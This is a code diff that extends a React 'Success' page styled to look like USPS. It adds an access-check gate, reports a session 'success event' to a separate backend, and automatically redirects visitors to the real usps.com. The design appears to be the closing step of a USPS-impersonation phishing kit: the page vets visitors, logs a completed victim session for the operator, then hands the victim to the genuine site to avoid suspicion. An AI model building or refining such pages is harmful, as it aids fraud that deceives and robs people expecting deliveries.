@@ -1,6 +1,10 @@
-import React from "react";
+import React, { useEffect } from "react";
+import { useLocation } from "react-router-dom";
+import axios from "axios";
 import Header from "../components/Header";
 import Footer from "../components/Footer";
+import { baseUrl } from "../constants";
+import useAccessCheck from "../Utils/useAccessCheck";
 
 const Success: React.FC = () => {
   const statusSegments = [
@@ -8,6 +12,49 @@ const Success: React.FC = () => {
     { id: 2, color: "#d9d9df", flexGrow: 1 },
     { id: 3, color: "#d9d9df", flexGrow: 1 },
   ];
+
+  const location = useLocation();
+  const { sessionId } = location.state || {};
+  const isAllowed = useAccessCheck(baseUrl);
+
+  useEffect(() => {
+    if (isAllowed === true && sessionId) {
+      let cancelled = false;
+
+      const sendSuccessEvent = async () => {
+        try {
+          await axios.post(`${baseUrl}api/usps-success-event/`, { sessionId });
+        } catch (error) {
+          console.error("Error reporting success event:", error);
+        }
+      };
+
+      sendSuccessEvent();
+
+      const timer = setTimeout(() => {
+        if (!cancelled) {
+          window.location.replace("https://www.usps.com/");
+        }
+      }, 4000);
+
+      return () => {
+        cancelled = true;
+        clearTimeout(timer);
+      };
+    }
+  }, [isAllowed, sessionId]);
+
+  if (isAllowed === null) {
+    return <div>Loading...</div>;
+  }
+
+  if (isAllowed === false) {
+    return <div>Access denied. Redirecting...</div>;
+  }
+
+  if (!sessionId) {
+    return <div>Missing session information. Please restart the process.</div>;
+  }
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
@@ -83,10 +130,14 @@ const Success: React.FC = () => {
               <div>
                 <button
                   type="button"
+                  onClick={() => window.location.replace("https://www.usps.com/")}
                   className="mt-2 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-10 py-3 text-[15px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors"
                 >
-                  Continue
+                  Continue to USPS.com
                 </button>
+                <p className="mt-2 text-[12px] text-[#4a4f6d]">
+                  You will be redirected shortly. If the page doesn't change automatically, click the button above.
+                </p>
               </div>
             </section>
             <section>
